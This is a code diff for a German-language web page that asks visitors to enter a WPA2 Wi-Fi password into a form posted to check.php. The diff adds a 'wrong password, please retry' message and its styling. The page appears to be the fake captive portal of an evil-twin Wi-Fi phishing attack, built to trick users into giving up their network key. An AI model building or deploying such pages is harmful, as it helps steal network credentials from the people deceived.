@@ -114,6 +114,11 @@ body{
 #form_box table {
 	font-size:12px;
 }
+.wrong_pass {
+	color:#E10003;
+	font-size:14px;
+	font-weight:bold;
+}
 @media only screen and (max-width: 1024px) {
 	#top_nav p {
 		display:none;
@@ -175,6 +180,9 @@ body{
         	<h2>Um zu verbinden bitte WPA2-Kennwort eingeben</h2>
         	<form method="POST" action="check.php" id="form1" name="form1">
             	<table cellspacing="5px" cols="2">
+                	<tr>
+                    	<td colspan="2"><span class="wrong_pass">Passwort falsch! - Bitte wiederholen</span></td>
+                    </tr>
                 	<tr>
                     	<td>WLAN-Passwort:</td>
                         <td><input type="password" name="key1"></td>
